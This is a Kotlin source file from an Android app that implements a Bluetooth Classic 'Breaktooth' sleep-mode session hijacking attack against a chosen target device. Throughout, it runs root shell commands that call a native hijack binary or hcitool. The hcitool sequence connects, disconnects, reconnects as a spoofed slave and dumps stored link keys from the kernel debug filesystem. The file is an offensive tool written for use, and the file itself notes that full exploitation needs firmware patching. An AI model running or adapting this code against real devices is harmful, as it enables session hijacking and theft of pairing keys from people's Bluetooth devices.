package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Implementation of the Breaktooth (Sleep Mode Session Hijacking) attack.
 *
 * This module targets vulnerabilities in the Bluetooth sleep/power-saving mode
 * of BR/EDR (Classic) connections at the Baseband/LMP layer. Breaktooth exploits
 * two weaknesses:
 *   1. No security notification is generated when a session disconnects during
 *      sleep/power-saving mode.
 *   2. The Master device accepts new connections from Slaves after disconnection
 *      without re-authentication.
 *
 * Together, these allow an attacker to hijack an active session and overwrite
 * the link key without requiring jamming. A PoC exists for Linux environments.
 *
 * The module first checks for a dedicated native binary (`breaktooth_hijack`).
 * If that binary is not present, it falls back to hcitool to create an ACL
 * connection, monitor link supervision timeouts, detect sleep mode transitions,
 * attempt reconnection with spoofed parameters, and read link key state from
 * the kernel debug filesystem.
 *
 * Root is required for all approaches (Baseband/LMP manipulation, hcitool access,
 * firmware patching). All privileged operations are executed through [RootExecutor].
 */
class BreaktoothModule {

    companion object {
        private const val TAG = "BreaktoothModule"
        private const val BREAKTOOTH_BINARY_PATH = "/data/local/tmp/breaktooth_hijack"

        /**
         * Default link supervision timeout in slots (0x7D00 = 20 seconds).
         * When the link supervision timer expires the controller considers
         * the link lost. Breaktooth exploits the window between sleep mode
         * entry and this timeout.
         */
        private const val DEFAULT_LINK_SUPERVISION_TIMEOUT_SLOTS = 0x7D00
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the Breaktooth sleep mode session hijacking workflow against
     * the target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Check if the native breaktooth_hijack binary exists
     * 3. If it exists, run it against the target
     * 4. Otherwise, use hcitool to create an ACL connection and probe
     *    sleep mode behavior
     *
     * @param targetDevice The Bluetooth device to attack.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting Breaktooth (Sleep Mode Session Hijacking) on ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("Breaktooth requires root for Baseband/LMP manipulation and hcitool access. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $BREAKTOOTH_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native breaktooth_hijack binary
            emit("Native breaktooth_hijack binary found at $BREAKTOOTH_BINARY_PATH")
            emit("Executing: $BREAKTOOTH_BINARY_PATH -t $mac")

            val output = RootExecutor.execute("$BREAKTOOTH_BINARY_PATH -t $mac")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("breaktooth_hijack execution failed.")
            } else {
                emit("breaktooth_hijack execution completed.")
            }
        } else {
            // Fallback: use hcitool to probe sleep mode behavior
            emit("Native binary not found at $BREAKTOOTH_BINARY_PATH")
            emit("Falling back to hcitool-based sleep mode probing...")

            executeHcitoolApproach(mac)
        }
    }

    /**
     * Uses hcitool to create an ACL connection, monitor link supervision
     * timeouts, check for sleep mode transitions, attempt reconnection with
     * spoofed parameters, and read link key state from the kernel debug
     * filesystem.
     *
     * This fallback approach probes the target's susceptibility to session
     * hijacking during sleep mode without requiring firmware patches, though
     * full exploitation still requires them.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String
    ) {
        // Step 1: Create ACL connection
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 2: Monitor link supervision timeout
        emit("Reading link supervision timeout for connection to $mac...")
        val lstoResult = RootExecutor.execute("hcitool lst $mac")
        if (lstoResult.startsWith("Error") || lstoResult.isBlank()) {
            emit("Could not read link supervision timeout: ${lstoResult.ifBlank { "(no output)" }}")
            emit("Using default assumption: ${DEFAULT_LINK_SUPERVISION_TIMEOUT_SLOTS} slots (~20s).")
        } else {
            emit("Link supervision timeout: $lstoResult")
            val timeoutMatch = Regex("(\\d+)").find(lstoResult)
            val timeoutSlots = timeoutMatch?.groupValues?.get(1)?.toIntOrNull()
            if (timeoutSlots != null) {
                val timeoutMs = timeoutSlots * 625 / 1000 // 1 slot = 0.625ms
                emit("Timeout value: $timeoutSlots slots (~${timeoutMs}ms).")
                if (timeoutMs < 5000) {
                    emit("WARNING: Short supervision timeout -- sleep mode transitions " +
                            "may trigger rapid disconnections, increasing hijack window.")
                }
            }
        }

        // Step 3: Check for sleep mode transitions via power save state
        emit("Checking power save / sniff mode state...")
        val connInfoResult = RootExecutor.execute("hcitool con")
        if (connInfoResult.startsWith("Error") || connInfoResult.isBlank()) {
            emit("Could not retrieve connection info: ${connInfoResult.ifBlank { "(no output)" }}")
        } else {
            for (line in connInfoResult.lines()) {
                if (line.isNotBlank()) {
                    emit("  conn: $line")
                }
            }

            val targetConn = connInfoResult.lines().find {
                it.contains(mac, ignoreCase = true)
            }
            if (targetConn != null) {
                emit("Connection to $mac is active.")

                // Check if sniff mode is active (common sleep/power-saving mode)
                val sniffCheck = RootExecutor.execute(
                    "cat /sys/kernel/debug/bluetooth/hci0/conn_info 2>/dev/null"
                )
                if (!sniffCheck.startsWith("Error") && sniffCheck.isNotBlank()) {
                    val targetInfo = sniffCheck.lines().filter {
                        it.contains(mac, ignoreCase = true) || it.contains("sniff", ignoreCase = true)
                    }
                    for (line in targetInfo) {
                        emit("  mode: $line")
                    }
                    if (sniffCheck.contains("SNIFF", ignoreCase = true)) {
                        emit("SNIFF MODE DETECTED: Target is in power-saving mode.")
                        emit("This is the vulnerable window for session hijacking.")
                    } else {
                        emit("Target is in active mode (not in sniff/sleep).")
                        emit("Hijack requires the target to enter power-saving mode.")
                    }
                } else {
                    emit("Sniff mode state unavailable via debugfs.")
                }
            } else {
                emit("Target $mac not found in active connections. Connection may have dropped.")
                emit("Attempting to re-establish...")
                val recc = RootExecutor.execute("hcitool cc $mac")
                emit("Reconnection result: ${recc.ifBlank { "OK" }}")
            }
        }

        // Step 4: Attempt reconnection with spoofed parameters
        emit("Attempting reconnection with spoofed parameters...")
        emit("Disconnecting current link...")
        val dcResult = RootExecutor.execute("hcitool dc $mac")
        emit("Disconnect result: ${dcResult.ifBlank { "OK" }}")

        emit("Waiting for sleep mode transition window...")
        // Short delay to allow the remote device to enter sleep/power-saving
        val sleepResult = RootExecutor.execute("sleep 2 && echo done")
        emit("Reconnecting to $mac as spoofed slave...")
        val reconnResult = RootExecutor.execute("hcitool cc --role=s $mac")
        if (reconnResult.startsWith("Error")) {
            emit("Spoofed reconnection failed: $reconnResult")
            emit("The target may enforce re-authentication on reconnection (not vulnerable).")
        } else {
            emit("Reconnection result: ${reconnResult.ifBlank { "OK (no output = success)" }}")
            emit("Connection re-established. Checking if link key was preserved or overwritten...")
        }

        // Step 5: Read link key state from debugfs
        emit("Reading link key state from kernel debug filesystem...")
        val linkKeyResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/link_keys 2>/dev/null"
        )

        if (linkKeyResult.startsWith("Error") || linkKeyResult.isBlank()) {
            emit("Link key state unavailable -- requires kernel debug access (debugfs).")
            emit("Ensure debugfs is mounted: mount -t debugfs none /sys/kernel/debug")
        } else {
            val targetKeyLines = linkKeyResult.lines().filter {
                it.contains(mac, ignoreCase = true)
            }
            if (targetKeyLines.isNotEmpty()) {
                emit("Link key entry found for $mac:")
                for (line in targetKeyLines) {
                    emit("  key: $line")
                }
                evaluateLinkKeyState(mac, targetKeyLines)
            } else {
                emit("No link key entry found for $mac in debugfs.")
                emit("The link key may have been cleared or never established.")
            }
        }

        // Step 6: Check authentication state after reconnection
        emit("Verifying authentication state after reconnection...")
        val authResult = RootExecutor.execute("hcitool auth $mac")
        if (authResult.startsWith("Error")) {
            emit("Authentication probe failed: $authResult")
            emit("Target may have disconnected or rejected authentication.")
        } else {
            emit("Authentication result: ${authResult.ifBlank { "OK" }}")
            emit("If authentication succeeded without user interaction, the session " +
                    "was hijacked using the existing or overwritten link key.")
        }

        emit("")
        emit("=== Breaktooth Assessment Complete ===")
        emit("Full exploitation requires firmware patching to manipulate Baseband/LMP " +
                "layer responses during the sleep mode reconnection window.")
        emit("The hcitool probe checks susceptibility indicators only.")
    }

    /**
     * Evaluates the link key state observed in debugfs after a reconnection
     * attempt. Compares key type and presence to determine if the key was
     * preserved, overwritten, or cleared during the hijack attempt.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.evaluateLinkKeyState(
        mac: String,
        keyLines: List<String>
    ) {
        // Parse key type from debugfs output (format varies by kernel version)
        val keyTypeMatch = Regex("type\\s+(\\d+)", RegexOption.IGNORE_CASE).find(
            keyLines.joinToString(" ")
        )
        val keyType = keyTypeMatch?.groupValues?.get(1)?.toIntOrNull()

        when {
            keyType == null -> {
                emit("Could not determine link key type from debugfs output.")
                emit("Manual analysis of the key entry is recommended.")
            }
            keyType == 0x00 -> {
                emit("Link key type: 0x00 (Combination Key)")
                emit("This is a legacy key type. If it changed after reconnection, " +
                        "the link key was overwritten during the hijack attempt.")
            }
            keyType == 0x04 -> {
                emit("Link key type: 0x04 (Unauthenticated Combination Key from P-192)")
                emit("WARNING: Unauthenticated key accepted after reconnection. " +
                        "This suggests the target did not enforce re-authentication.")
            }
            keyType == 0x05 -> {
                emit("Link key type: 0x05 (Authenticated Combination Key from P-192)")
                emit("Authenticated key present. The target may enforce re-authentication, " +
                        "reducing hijack susceptibility.")
            }
            keyType == 0x07 -> {
                emit("Link key type: 0x07 (Authenticated Combination Key from P-256)")
                emit("Strong authenticated key (Secure Connections). Session hijacking " +
                        "is significantly harder with SC-derived keys.")
            }
            keyType == 0x08 -> {
                emit("Link key type: 0x08 (Unauthenticated Combination Key from P-256)")
                emit("WARNING: Unauthenticated P-256 key. Secure Connections is in use " +
                        "but without MITM protection -- hijack may still be possible.")
            }
            else -> {
                emit("Link key type: 0x${keyType.toString(16).uppercase()} (unknown/reserved)")
                emit("Unrecognized key type. Manual analysis recommended.")
                Log.w(TAG, "Unknown link key type $keyType for $mac")
            }
        }
    }
}
